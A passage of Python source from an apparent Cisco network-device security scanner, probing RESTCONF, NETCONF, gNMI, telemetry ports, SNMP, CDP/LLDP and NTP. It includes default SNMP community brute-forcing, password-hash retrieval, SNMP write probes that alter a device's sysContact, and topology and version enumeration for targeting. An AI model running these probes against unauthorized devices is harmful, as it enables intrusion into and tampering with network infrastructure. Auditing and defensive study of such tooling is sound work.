    status, body = _get('/restconf/data/ietf-routing:routing')
    if status == 200 and body:
        findings.append({
            'severity': 'HIGH',
            'title':    'IETF_ROUTING_TABLE_UNAUTH',
            'detail':   (
                f'GET /restconf/data/ietf-routing:routing returned HTTP 200 '
                f'without authentication; ietf-routing YANG module (RFC 8022) '
                f'exposes routing RIB entries, routing protocol instances, '
                f'router-id, and static route tables; enables full network topology '
                f'reconstruction and route injection surface identification; '
                f'sample: {body[:200].strip()!r}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_cisco_model_driven_telemetry(host: str, port: int = 57500, timeout: float = 10.0) -> list:
    """Detect Cisco model-driven telemetry (MDT), NETCONF, and gNMI exposure.

    Cisco Model-Driven Telemetry (MDT) streams YANG-modeled operational data from
    network devices to external collectors at configurable intervals using gRPC
    dial-out mode. IOS-XE and IOS-XR use gRPC port 57500; NX-OS uses port 57400.
    An open MDT port enables gRPC reflection attacks and subscription enumeration.

    The HTTP/2 client preface (RFC 7540 §3.5) is sent as a banner probe: any
    response confirms the endpoint is a live gRPC server accepting connections.

    NETCONF (RFC 6241) runs over SSH or TLS on port 830. The initial hello
    exchange is pre-authentication: the server hello discloses all supported
    NETCONF capabilities and YANG namespace URIs before any credential check,
    including Cisco-proprietary namespaces (http://cisco.com/ns/yang/).

    gNMI (gRPC Network Management Interface, OpenConfig) on port 9339 provides
    Capabilities/Get/Set/Subscribe RPCs — full YANG path enumeration and config
    modification surface on IOS-XR and NX-OS.

    Sources: YANG and NETCONF (ISBN 9780135180471), NX-OS Programmability Guide
    9.3(x) ch-netconf-agent.md, Cisco MDT Configuration Guide for IOS-XE.
    """
    import socket as _socket
    import ssl as _ssl
    import re as _re

    findings = []

    # HTTP/2 client preface — standard gRPC connection preamble (RFC 7540 §3.5).
    # Any live gRPC server responds with a SETTINGS frame or GOAWAY, confirming
    # the endpoint accepts gRPC connections.
    _H2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

    def _tcp_probe(target_port: int, send_bytes: bytes = b'') -> tuple:
        """Return (connected: bool, recv_bytes: bytes)."""
        try:
            with _socket.create_connection((host, target_port), timeout=timeout) as s:
                if send_bytes:
                    s.sendall(send_bytes)
                    s.settimeout(2.0)
                    try:
                        data = s.recv(512)
                    except (_socket.timeout, OSError):
                        data = b''
                else:
                    data = b''
                return True, data
        except (OSError, ConnectionRefusedError):
            return False, b''

    # -----------------------------------------------------------------------
    # IOS-XE / IOS-XR MDT gRPC — port 57500
    # -----------------------------------------------------------------------
    connected, _ = _tcp_probe(57500)
    if connected:
        findings.append({
            'severity': 'HIGH',
            'title':    'CISCO_MDT_GRPC_PORT_OPEN',
            'detail':   (
                f'TCP connect to {host}:57500 succeeded; Cisco model-driven telemetry '
                f'gRPC listener (IOS-XE/IOS-XR) is reachable; MDT streams YANG-modeled '
                f'operational data (CPU, memory, BGP state, interface counters) to '
                f'collectors via gRPC dial-out; open port enables gRPC reflection '
                f'attacks, subscription enumeration, and operational state harvesting'
            ),
            'host': host,
            'port': 57500,
        })

        # HTTP/2 preface probe — response confirms live gRPC endpoint
        connected2, recv2 = _tcp_probe(57500, _H2_PREFACE)
        if connected2 and recv2:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'CISCO_MDT_GRPC_RESPONSIVE',
                'detail':   (
                    f'gRPC endpoint at {host}:57500 responded to HTTP/2 client preface '
                    f'({len(_H2_PREFACE)} bytes) with {len(recv2)} bytes; live gRPC '
                    f'server confirmed; enables unauthenticated gRPC reflection '
                    f'enumeration of available telemetry paths and MDT subscription '
                    f'endpoints; response prefix: {recv2[:32]!r}'
                ),
                'host': host,
                'port': 57500,
            })

    # -----------------------------------------------------------------------
    # NX-OS MDT gRPC — port 57400
    # -----------------------------------------------------------------------
    connected, _ = _tcp_probe(57400)
    if connected:
        findings.append({
            'severity': 'HIGH',
            'title':    'NXOS_MDT_GRPC_PORT_OPEN',
            'detail':   (
                f'TCP connect to {host}:57400 succeeded; Cisco NX-OS model-driven '
                f'telemetry gRPC listener is reachable; NX-OS MDT streams DME '
                f'(Data Management Engine) operational state using '
                f'http://cisco.com/ns/yang/cisco-nx-os-device namespace; '
                f'open port enables gRPC reflection and subscription enumeration'
            ),
            'host': host,
            'port': 57400,
        })

    # -----------------------------------------------------------------------
    # Streaming telemetry raw TCP — port 5432
    # -----------------------------------------------------------------------
    # IOS-XE supports TCP-native (non-gRPC) telemetry delivery mode as an
    # alternative to gRPC dial-out. The collector listens on a configured TCP
    # port; the device dials out and streams GPB-encoded or JSON payloads.
    connected, _ = _tcp_probe(5432, b'\x00')
    if connected:
        findings.append({
            'severity': 'HIGH',
            'title':    'CISCO_STREAMING_TELEMETRY_TCP',
            'detail':   (
                f'TCP connect to {host}:5432 succeeded; possible Cisco streaming '
                f'telemetry raw TCP delivery endpoint; IOS-XE supports TCP-based '
                f'telemetry delivery as alternative to gRPC dial-out mode; '
                f'open port may allow unauthenticated subscription to operational '
                f'data streams (interface counters, CPU/memory, BGP updates)'
            ),
            'host': host,
            'port': 5432,
        })

    # -----------------------------------------------------------------------
    # NETCONF — port 830
    # -----------------------------------------------------------------------
    # NETCONF (RFC 6241) hello exchange occurs pre-authentication. The server
    # hello discloses all supported capabilities and YANG namespace URIs before
    # any credential exchange — complete model enumeration without authentication.
    # NX-OS NETCONF namespace: http://cisco.com/ns/yang/cisco-nx-os-device
    # (from ch-netconf-agent.md in NX-OS Programmability Guide 9.3(x))
    _NETCONF_HELLO = (
        b"<?xml version='1.0' encoding='UTF-8'?>"
        b"<hello xmlns='urn:ietf:params:xml:ns:netconf:base:1.0'>"
        b"<capabilities>"
        b"<capability>urn:ietf:params:netconf:base:1.0</capability>"
        b"</capabilities>"
        b"</hello>]]>]]>"
    )

    try:
        with _socket.create_connection((host, 830), timeout=timeout) as raw_sock:
            findings.append({
                'severity': 'HIGH',
                'title':    'NETCONF_PORT_OPEN',
                'detail':   (
                    f'TCP connect to {host}:830 succeeded; NETCONF (RFC 6241) '
                    f'listener is reachable; NETCONF provides model-driven '
                    f'configuration management with read/write access to all '
                    f'YANG-modeled datastores (running, candidate, startup)'
                ),
                'host': host,
                'port': 830,
            })

            # Attempt TLS upgrade then send NETCONF hello to elicit server hello
            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            try:
                tls_sock = ctx.wrap_socket(raw_sock, server_hostname=host)
                tls_sock.sendall(_NETCONF_HELLO)
                tls_sock.settimeout(3.0)
                try:
                    resp = tls_sock.recv(4096)
                except (_socket.timeout, OSError):
                    resp = b''

                if resp and b'hello' in resp.lower():
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'NETCONF_HELLO_RESPONSIVE',
                        'detail':   (
                            f'NETCONF server at {host}:830 responded to client hello '
                            f'with {len(resp)} bytes; server hello received; '
                            f'capability negotiation completed without authentication; '
                            f'response prefix: {resp[:128]!r}'
                        ),
                        'host': host,
                        'port': 830,
                    })

                    # Extract capability URIs from server hello
                    caps = _re.findall(rb'<capability>(.*?)</capability>', resp, _re.DOTALL)
                    if caps:
                        cap_strs = [
                            c.decode('utf-8', errors='replace').strip()
                            for c in caps[:20]
                        ]
                        findings.append({
                            'severity': 'HIGH',
                            'title':    'NETCONF_CAPABILITIES_DISCLOSED',
                            'detail':   (
                                f'NETCONF server disclosed {len(caps)} capabilities '
                                f'in unauthenticated hello; capabilities reveal '
                                f'supported YANG modules, RFC compliance level, and '
                                f'vendor extensions; '
                                f'capabilities: {cap_strs}'
                            ),
                            'host': host,
                            'port': 830,
                        })

                        # Cisco YANG namespace confirms Cisco-proprietary model access
                        cisco_caps = [c for c in cap_strs if 'cisco.com/ns/yang' in c]
                        if cisco_caps:
                            findings.append({
                                'severity': 'CRITICAL',
                                'title':    'CISCO_YANG_CAPABLE',
                                'detail':   (
                                    f'NETCONF server advertised Cisco YANG namespace '
                                    f'"http://cisco.com/ns/yang/" in unauthenticated '
                                    f'capability exchange; Cisco-proprietary YANG models '
                                    f'(Cisco-IOS-XE-native, cisco-nx-os-device) are '
                                    f'loaded and accessible via NETCONF without auth; '
                                    f'Cisco YANG capabilities: {cisco_caps}'
                                ),
                                'host': host,
                                'port': 830,
                            })
            except (_ssl.SSLError, OSError):
                pass
    except (OSError, ConnectionRefusedError):
        pass

    # -----------------------------------------------------------------------
    # gNMI — port 9339 (IOS-XR / NX-OS)
    # -----------------------------------------------------------------------
    # gNMI (gRPC Network Management Interface) is the OpenConfig-defined protocol
    # for telemetry and configuration. IOS-XR and NX-OS support it on port 9339.
    # Provides Capabilities, Get, Set, and Subscribe RPCs over gRPC — full YANG
    # path enumeration, operational reads, and configuration modification surface.
    connected, _ = _tcp_probe(9339)
    if connected:
        findings.append({
            'severity': 'HIGH',
            'title':    'GNMI_PORT_OPEN',
            'detail':   (
                f'TCP connect to {host}:9339 succeeded; gNMI (gRPC Network Management '
                f'Interface) listener reachable on IOS-XR/NX-OS standard port; '
                f'gNMI provides Capabilities, Get, Set, and Subscribe RPCs over gRPC; '
                f'unauthenticated access enables full YANG path enumeration, operational '
                f'state reads, and configuration modification via Set RPC'
            ),
            'host': host,
            'port': 9339,
        })

    return findings


# ---------------------------------------------------------------------------
# Cisco IOS SNMP management plane full reverse-engineering surface
# Nutshell ch25: community strings are plaintext passwords; 'public' universal
# default; RW community enables config writes; access-lists rarely applied
# ---------------------------------------------------------------------------

def probe_cisco_ios_snmp_full_re(host: str, port: int = 161, timeout: float = 5.0) -> list:
    """
    Deep Cisco IOS SNMP management plane reverse-engineering surface.

    Nutshell ch25 (Enabling SNMP): IOS community strings act as plaintext
    passwords in SNMPv1/v2c; 'public' is the universal default across all
    vendors; RW community grants full SNMP write access without additional
    authentication.  Probe chain:
      - Community brute-force (public/private/cisco/...) -> CRITICAL on match
      - sysDescr OID 1.3.6.1.2.1.1.1.0 -> IOS version string extraction
      - sysName OID 1.3.6.1.2.1.1.5.0 -> hostname disclosure
      - Cisco enterprise MIB 1.3.6.1.4.1.9.2.1.3 -> private MIB access flag
      - Local user password hash OID 1.3.6.1.4.1.9.2.1.56.0
      - Cisco IPsec tunnel config OID 1.3.6.1.4.1.9.9.171.1.2.3.1.7
      - SNMP SetRequest against sysContact -> write community confirmation
      - SNMPv3 discovery probe -> noAuthNoPriv risk flag
    """
    import re as _re
    findings: list = []

    # Helper: send SNMP GetRequest (UDP), return raw response or None
    def _snmp_udp(community: str, oid: str) -> Optional[bytes]:
        pkt = _snmp_get_request(community, oid)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(pkt, (host, port))
            data, _ = s.recvfrom(8192)
            s.close()
            return data
        except Exception:
            return None

    # -----------------------------------------------------------------------
    # Community string brute-force — sysDescr OID as liveness probe
    # Nutshell ch25: almost all vendors ship 'public' as default; change it
    # -----------------------------------------------------------------------
    _DEFAULT_COMMUNITIES = [
        'public', 'private', 'cisco', 'community', 'default', 'read', 'monitor',
    ]
    working_comm: str = ''
    for comm in _DEFAULT_COMMUNITIES:
        resp = _snmp_udp(comm, '1.3.6.1.2.1.1.1.0')
        if resp and len(resp) > 10 and b'\xa2' in resp:
            working_comm = comm
            findings.append({
                'severity': 'CRITICAL',
                'title':    'IOS_SNMP_DEFAULT_COMMUNITY',
                'detail':   (
                    f'SNMP community "{comm}" accepted on {host}:{port}; '
                    f'Nutshell ch25: vendors configure SNMP devices with "public" '
                    f'as default — the first string an outsider tries; '
                    f'GetResponse (tag 0xa2) confirms RO access; '
                    f'rotate all community strings and apply access-list restrictions'
                ),
                'host': host,
                'port': port,
            })
            break

    # -----------------------------------------------------------------------
    # sysDescr OID 1.3.6.1.2.1.1.1.0 — IOS platform + version string
    # -----------------------------------------------------------------------
    if working_comm:
        resp = _snmp_udp(working_comm, '1.3.6.1.2.1.1.1.0')
        if resp:
            values = _parse_snmp_response(resp)
            sysdescr = ' '.join(v for v in values if v and v != working_comm)
            if sysdescr:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'IOS_SNMP_RESPONSIVE',
                    'detail':   (
                        f'SNMP GetResponse received on {host}:{port} '
                        f'(community="{working_comm}"); agent reachable without '
                        f'access-list filtering; response {len(resp)} bytes'
                    ),
                    'host': host,
                    'port': port,
                })
                if 'Cisco' in sysdescr or 'IOS' in sysdescr:
                    findings.append({
                        'severity': 'HIGH',
                        'title':    'IOS_SNMP_SYSDESCR',
                        'detail':   (
                            f'sysDescr confirms Cisco IOS device: '
                            f'"{sysdescr[:240]}"; '
                            f'Nutshell ch25: sysDescr leaks hardware platform, '
                            f'IOS feature set, and software train'
                        ),
                        'host': host,
                        'port': port,
                    })
                ver_m = _re.search(r'Version\s+([\d\w()./-]+)', sysdescr, _re.I)
                if ver_m:
                    findings.append({
                        'severity': 'MEDIUM',
                        'title':    'IOS_VERSION_VIA_SNMP',
                        'detail':   (
                            f'IOS version extracted from sysDescr via SNMP: '
                            f'"{ver_m.group(1)}"; '
                            f'version string enables targeted CVE selection '
                            f'and EoL/EoS status verification; '
                            f'full sysDescr: "{sysdescr[:300]}"'
                        ),
                        'host': host,
                        'port': port,
                    })

    # -----------------------------------------------------------------------
    # sysName OID 1.3.6.1.2.1.1.5.0 — hostname disclosure
    # Nutshell ch3 (Basic Router Configuration): hostname set with `hostname`
    # command; leaks naming conventions and network taxonomy via SNMP
    # -----------------------------------------------------------------------
    if working_comm:
        resp = _snmp_udp(working_comm, '1.3.6.1.2.1.1.5.0')
        if resp:
            values = _parse_snmp_response(resp)
            sysname = next(
                (v for v in values if v and v != working_comm and len(v) > 1),
                '',
            )
            if sysname:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'IOS_HOSTNAME_VIA_SNMP',
                    'detail':   (
                        f'Router hostname disclosed via sysName OID '
                        f'1.3.6.1.2.1.1.5.0: "{sysname}"; '
                        f'Nutshell ch3: IOS `hostname` command sets sysName; '
                        f'hostname enables DNS correlation, naming-convention '
                        f'inference, and lateral movement target identification'
                    ),
                    'host': host,
                    'port': port,
                })

    # -----------------------------------------------------------------------
    # Cisco enterprise MIB 1.3.6.1.4.1.9.2.1.3 — ifDescr (Cisco private)
    # OID under enterprise 1.3.6.1.4.1.9 confirms Cisco IOS and exposes
    # interface descriptor table from the private Cisco MIB tree
    # -----------------------------------------------------------------------
    if working_comm:
        resp = _snmp_udp(working_comm, '1.3.6.1.4.1.9.2.1.3')
        if resp and b'\xa2' in resp and len(resp) > 15:
            findings.append({
                'severity': 'HIGH',
                'title':    'IOS_CISCO_MIBS_ACCESSIBLE',
                'detail':   (
                    f'Cisco enterprise MIB OID 1.3.6.1.4.1.9.2.1.3 returned '
                    f'data from {host}:{port}; '
                    f'enterprise OID 1.3.6.1.4.1.9 subtree (Cisco private MIBs) '
                    f'is loaded and readable; exposes interface descriptors, '
                    f'chassis data, and IOS management internals without '
                    f'additional authentication beyond community string'
                ),
                'host': host,
                'port': port,
            })

    # -----------------------------------------------------------------------
    # Cisco local user password hash OID 1.3.6.1.4.1.9.2.1.56.0
    # Nutshell ch13: type 7 = XOR-reversible; type 5 = MD5-crypt brute-forceable
    # -----------------------------------------------------------------------
    if working_comm:
        resp = _snmp_udp(working_comm, '1.3.6.1.4.1.9.2.1.56.0')
        if resp and b'\xa2' in resp:
            values = _parse_snmp_response(resp)
            hash_val = next(
                (v for v in values if v and len(v) > 4 and v != working_comm),
                '',
            )
            if hash_val:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'IOS_PASSWORD_HASH_VIA_SNMP',
                    'detail':   (
                        f'Cisco local user password hash returned via SNMP OID '
                        f'1.3.6.1.4.1.9.2.1.56.0 from {host}:{port}; '
                        f'Nutshell ch13: type 7 hashes are XOR-reversible '
                        f'(see decode_type7); type 5 (MD5) are brute-forceable '
                        f'via dictionary attack; '
                        f'hash: "{hash_val[:80]}"'
                    ),
                    'host': host,
                    'port': port,
                })

    # -----------------------------------------------------------------------
    # Cisco IPsec tunnel config OID 1.3.6.1.4.1.9.9.171.1.2.3.1.7
    # CISCO-IPSEC-FLOW-MONITOR-MIB ciscoIPsecFlowActiveTable:
    # discloses tunnel peer addresses, SAs, and transform sets
    # -----------------------------------------------------------------------
    if working_comm:
        resp = _snmp_udp(working_comm, '1.3.6.1.4.1.9.9.171.1.2.3.1.7')
        if resp and b'\xa2' in resp and len(resp) > 20:
            findings.append({
                'severity': 'HIGH',
                'title':    'IOS_IPSEC_VIA_SNMP',
                'detail':   (
                    f'Cisco IPsec MIB OID 1.3.6.1.4.1.9.9.171.1.2.3.1.7 returned '
                    f'data from {host}:{port}; '
                    f'CISCO-IPSEC-FLOW-MONITOR-MIB ciscoIPsecFlowActiveTable '
                    f'discloses VPN peer IP addresses, transform sets, and SA '
                    f'lifetimes; enables VPN topology mapping without authentication'
                ),
                'host': host,
                'port': port,
            })

    # -----------------------------------------------------------------------
    # SNMP SET test — write community probe via sysContact OID 1.3.6.1.2.1.1.4.0
    # Nutshell ch25: RW community allows SNMP management station to change
    # router state; SetRequest PDU tag 0xa3 (vs GetRequest 0xa0)
    # -----------------------------------------------------------------------
    _WRITE_COMMUNITIES = ['private', 'cisco', 'write', 'rw', 'admin', 'public']
    for wcomm in _WRITE_COMMUNITIES:
        try:
            oid_bytes = _ber_oid('1.3.6.1.2.1.1.4.0')
            new_val = _ber_str(b'probe')
            varbind = _ber_seq(oid_bytes + new_val)
            varbinds = _ber_seq(varbind)
            pdu_body = _ber_int(77) + _ber_int(0) + _ber_int(0) + varbinds
            set_pdu = bytes([0xa3, len(pdu_body)]) + pdu_body
            comm_enc = _ber_str(wcomm.encode())
            msg = _ber_seq(_ber_int(0) + comm_enc + set_pdu)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(msg, (host, port))
            set_resp, _ = s.recvfrom(4096)
            s.close()
            if set_resp and b'\xa2' in set_resp:
                # Scan for request-id=77, then read following error-status INTEGER
                err_status = 99
                i = 0
                while i < len(set_resp) - 6:
                    if set_resp[i] == 0x02:  # INTEGER tag
                        ilen = set_resp[i + 1]
                        if ilen <= 4:
                            val = int.from_bytes(
                                set_resp[i + 2:i + 2 + ilen], 'big', signed=False)
                            if val == 77:  # found request-id
                                j = i + 2 + ilen
                                if j + 1 < len(set_resp) and set_resp[j] == 0x02:
                                    elen = set_resp[j + 1]
                                    err_status = int.from_bytes(
                                        set_resp[j + 2:j + 2 + elen], 'big')
                                break
                    i += 1
                if err_status == 0:
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'IOS_SNMP_WRITE_COMMUNITY',
                        'detail':   (
                            f'SNMP SetRequest with community "{wcomm}" returned '
                            f'error-status=noError from {host}:{port}; '
                            f'Nutshell ch25: RW community enables the management '
                            f'station to change router state via SNMP; '
                            f'confirmed write access to sysContact OID; '
                            f'attacker can modify routing tables, shut interfaces, '
                            f'or redirect SNMP traps to an attacker-controlled host'
                        ),
                        'host': host,
                        'port': port,
                    })
                    break
        except Exception:
            pass

    # -----------------------------------------------------------------------
    # SNMPv3 noAuthNoPriv probe — RFC 3414 discovery handshake
    # Send minimal v3 GetRequest; any response indicates v3 is enabled;
    # noAuthNoPriv security level provides no integrity or privacy protection
    # -----------------------------------------------------------------------
    try:
        oid_v3 = _ber_oid('1.3.6.1.2.1.1.1.0')
        vb_v3 = _ber_seq(oid_v3 + bytes([0x05, 0x00]))
        varbinds_v3 = _ber_seq(vb_v3)
        pdu_body_v3 = _ber_int(301) + _ber_int(0) + _ber_int(0) + varbinds_v3
        get_pdu_v3 = bytes([0xa0, len(pdu_body_v3)]) + pdu_body_v3
        ctx_engine = _ber_str(b'')
        ctx_name = _ber_str(b'')
        scoped_pdu = _ber_seq(ctx_engine + ctx_name + get_pdu_v3)
        hdr = _ber_seq(
            _ber_int(0x1001) + _ber_int(65507) +
            _ber_str(bytes([0x04])) + _ber_int(3)
        )
        sec_params = _ber_str(b'')
        v3_msg = _ber_seq(_ber_int(3) + hdr + sec_params + scoped_pdu)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(v3_msg, (host, port))
        v3_resp, _ = s.recvfrom(4096)
        s.close()
        if v3_resp and len(v3_resp) > 10:
            findings.append({
                'severity': 'MEDIUM',
                'title':    'IOS_SNMPV3_NOAUTHNOPRIV',
                'detail':   (
                    f'SNMPv3 probe received {len(v3_resp)}-byte response '
                    f'from {host}:{port}; device supports SNMPv3 (RFC 3412); '
                    f'if any USM user is configured with noAuthNoPriv security '
                    f'level, an attacker can enumerate MIBs without credentials; '
                    f'RFC 3414 §3.2: noAuthNoPriv provides no message integrity '
                    f'or privacy — operationally equivalent to SNMPv1 with a '
                    f'guessable community string'
                ),
                'host': host,
                'port': port,
            })
    except Exception:
        pass

    return findings


# ---------------------------------------------------------------------------
# Cisco IOS CDP/LLDP topology exposure and NTP fingerprinting
# Nutshell ch26: CDP enabled by default on all IOS interfaces; discloses
# neighbor device IDs, IPs, IOS versions, and hardware platforms to any
# party holding the SNMP community string
# ---------------------------------------------------------------------------

def probe_cisco_ios_cdp_lldp_exposure(host: str, port: int = 0, timeout: float = 5.0) -> list:
    """
    CDP and LLDP topology information leakage via SNMP, plus NTP fingerprinting.

    Nutshell ch26 (Cisco Discovery Protocol): CDP is enabled by default on
    all available IOS interfaces; reveals neighbor device IDs, IP addresses,
    IOS versions, and hardware platforms.  Disable on Internet-facing and
    untrusted interfaces.  LLDP (IEEE 802.1AB) supplements CDP in
    mixed-vendor environments.  NTP mode 3 probe on port 123 extracts
    stratum and upstream reference source.

    CDP via SNMP (CISCO-CDP-MIB):
      - cdpCacheDeviceId 1.3.6.1.4.1.9.9.23.1.2.1.1.6 -> neighbor hostnames
      - cdpCacheAddress  1.3.6.1.4.1.9.9.23.1.2.1.1.5 -> neighbor IP addrs
      - cdpCacheVersion  1.3.6.1.4.1.9.9.23.1.2.1.1.8 -> neighbor IOS vers
      - cdpCachePlatform 1.3.6.1.4.1.9.9.23.1.2.1.1.10 -> neighbor hw platforms
    LLDP via SNMP (LLDP-MIB, IEEE 802.1AB):
      - lldpRemSysName   1.0.8802.1.1.2.1.4.1.1.9 -> neighbor system names
      - lldpRemSysDesc   1.0.8802.1.1.2.1.4.1.1.10 -> neighbor descriptions
    NTP (port 123 UDP):
      - Mode 3 client request -> stratum + reference ID disclosure
    """
    import re as _re
    findings: list = []
    snmp_port = 161

    # Use 'public' community; caller may override via port arg (unused for SNMP)
    community = 'public'

    # -----------------------------------------------------------------------
    # CDP neighbor device IDs — cdpCacheDeviceId OID 1.3.6.1.4.1.9.9.23.1.2.1.1.6
    # Nutshell ch26: `show cdp neighbors` reveals Device ID, Platform, Port
    # -----------------------------------------------------------------------
    raw = _snmp_get_raw(host, community, '1.3.6.1.4.1.9.9.23.1.2.1.1.6',
                        snmp_port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        neighbor_ids = [v for v in vals if v and v != community and len(v) > 1]
        findings.append({
            'severity': 'CRITICAL',
            'title':    'CDP_NEIGHBOR_DEVICE_IDS',
            'detail':   (
                f'CDP neighbor device IDs readable via SNMP OID '
                f'1.3.6.1.4.1.9.9.23.1.2.1.1.6 from {host}:{snmp_port}; '
                f'Nutshell ch26: CDP is on by default on all IOS interfaces '
                f'and exposes neighboring device hostnames; '
                f'enables full Layer 2 topology mapping without authentication; '
                f'neighbor IDs: {neighbor_ids[:10]}'
            ),
            'host': host,
            'port': snmp_port,
        })

    # -----------------------------------------------------------------------
    # CDP neighbor IP addresses — cdpCacheAddress OID 1.3.6.1.4.1.9.9.23.1.2.1.1.5
    # Note: cdpCacheAddress stores address type + IP bytes; parse as best-effort
    # -----------------------------------------------------------------------
    raw = _snmp_get_raw(host, community, '1.3.6.1.4.1.9.9.23.1.2.1.1.5',
                        snmp_port, timeout)
    if raw is not None:
        # Extract 4-byte sequences that look like IPv4 addresses
        import re as _re2
        ipv4_matches = _re2.findall(
            rb'(?<!\d)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?!\d)', raw)
        neighbor_ips = [m.decode('ascii') for m in ipv4_matches[:10]]
        findings.append({
            'severity': 'CRITICAL',
            'title':    'CDP_NEIGHBOR_IPS',
            'detail':   (
                f'CDP neighbor IP addresses readable via SNMP OID '
                f'1.3.6.1.4.1.9.9.23.1.2.1.1.5 from {host}:{snmp_port}; '
                f'cdpCacheAddress encodes neighbor management addresses; '
                f'enables network topology enumeration and lateral movement '
                f'target selection; '
                f'neighbor IPs (extracted): {neighbor_ips}'
            ),
            'host': host,
            'port': snmp_port,
        })

    # -----------------------------------------------------------------------
    # CDP neighbor IOS versions — cdpCacheVersion OID 1.3.6.1.4.1.9.9.23.1.2.1.1.8
    # -----------------------------------------------------------------------
    raw = _snmp_get_raw(host, community, '1.3.6.1.4.1.9.9.23.1.2.1.1.8',
                        snmp_port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        ios_vers = [v for v in vals if v and v != community and len(v) > 3]
        ver_strs = []
        for v in ios_vers[:5]:
            m = _re.search(r'Version\s+([\d\w()./-]+)', v, _re.I)
            if m:
                ver_strs.append(m.group(1))
        findings.append({
            'severity': 'HIGH',
            'title':    'CDP_NEIGHBOR_IOS_VERSIONS',
            'detail':   (
                f'CDP neighbor IOS versions readable via SNMP OID '
                f'1.3.6.1.4.1.9.9.23.1.2.1.1.8 from {host}:{snmp_port}; '
                f'cdpCacheVersion reveals the full IOS version string for each '
                f'neighbor, enabling targeted CVE matching across adjacent devices; '
                f'versions extracted: {ver_strs}'
            ),
            'host': host,
            'port': snmp_port,
        })

    # -----------------------------------------------------------------------
    # CDP neighbor hardware platforms — cdpCachePlatform OID 1.3.6.1.4.1.9.9.23.1.2.1.1.10
    # Nutshell ch26: Platform field from `show cdp neighbors detail`
    # -----------------------------------------------------------------------
    raw = _snmp_get_raw(host, community, '1.3.6.1.4.1.9.9.23.1.2.1.1.10',
                        snmp_port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        platforms = [v for v in vals if v and v != community and len(v) > 2]
        findings.append({
            'severity': 'HIGH',
            'title':    'CDP_NEIGHBOR_PLATFORMS',
            'detail':   (
                f'CDP neighbor hardware platforms readable via SNMP OID '
                f'1.3.6.1.4.1.9.9.23.1.2.1.1.10 from {host}:{snmp_port}; '
                f'platform strings identify Cisco hardware models '
                f'(Catalyst 6509, ASR 1002, etc.) for each adjacent device; '
                f'platforms: {platforms[:10]}'
            ),
            'host': host,
            'port': snmp_port,
        })

    # -----------------------------------------------------------------------
    # LLDP neighbor system names — lldpRemSysName OID 1.0.8802.1.1.2.1.4.1.1.9
    # IEEE 802.1AB-2009; mixed-vendor environments use LLDP alongside CDP
    # -----------------------------------------------------------------------
    raw = _snmp_get_raw(host, community, '1.0.8802.1.1.2.1.4.1.1.9',
                        snmp_port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        lldp_names = [v for v in vals if v and v != community and len(v) > 1]
        findings.append({
            'severity': 'CRITICAL',
            'title':    'LLDP_NEIGHBOR_SYSNAMES',
            'detail':   (
                f'LLDP neighbor system names readable via SNMP OID '
                f'1.0.8802.1.1.2.1.4.1.1.9 from {host}:{snmp_port}; '
                f'LLDP-MIB lldpRemSysName supplements CDP in mixed-vendor '
                f'environments; discloses hostnames for non-Cisco neighbors '
                f'(Linux servers, non-Cisco switches) without authentication; '
                f'neighbor names: {lldp_names[:10]}'
            ),
            'host': host,
            'port': snmp_port,
        })

    # -----------------------------------------------------------------------
    # LLDP neighbor descriptions — lldpRemSysDesc OID 1.0.8802.1.1.2.1.4.1.1.10
    # lldpRemSysDesc mirrors sysDescr for each neighbor
    # -----------------------------------------------------------------------
    raw = _snmp_get_raw(host, community, '1.0.8802.1.1.2.1.4.1.1.10',
                        snmp_port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        lldp_descs = [v for v in vals if v and v != community and len(v) > 3]
        findings.append({
            'severity': 'HIGH',
            'title':    'LLDP_NEIGHBOR_DESCRIPTIONS',
            'detail':   (
                f'LLDP neighbor system descriptions readable via SNMP OID '
                f'1.0.8802.1.1.2.1.4.1.1.10 from {host}:{snmp_port}; '
                f'lldpRemSysDesc contains the full sysDescr of each LLDP '
                f'neighbor, leaking OS/kernel versions and hardware details; '
                f'sample descriptions: {[d[:80] for d in lldp_descs[:3]]}'
            ),
            'host': host,
            'port': snmp_port,
        })

    # -----------------------------------------------------------------------
    # NTP fingerprinting — UDP port 123, mode 3 (client) request
    # RFC 5905: NTP stratum 1 = primary reference; reference ID = 4-byte
    # ASCII source name (GPS, WWV, etc.) or upstream server IP
    # -----------------------------------------------------------------------
    try:
        # NTP v3 client request: LI=0, VN=3, Mode=3 → first byte = 0x1b
        ntp_req = bytes([0x1b]) + bytes(47)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(ntp_req, (host, 123))
        ntp_resp, _ = s.recvfrom(1024)
        s.close()
        if ntp_resp and len(ntp_resp) >= 48:
            li_vn_mode = ntp_resp[0]
            stratum = ntp_resp[1]
            ref_id_bytes = ntp_resp[12:16]
            # stratum 1: ref_id is ASCII source name; stratum 2+: upstream IP
            if stratum == 1:
                try:
                    ref_id_str = ref_id_bytes.decode('ascii').rstrip('\x00')
                except Exception:
                    ref_id_str = ref_id_bytes.hex()
            else:
                ref_id_str = '.'.join(str(b) for b in ref_id_bytes)
            findings.append({
                'severity': 'HIGH',
                'title':    'IOS_NTP_FINGERPRINT',
                'detail':   (
                    f'NTP mode 3 client request received {len(ntp_resp)}-byte '
                    f'server response from {host}:123; '
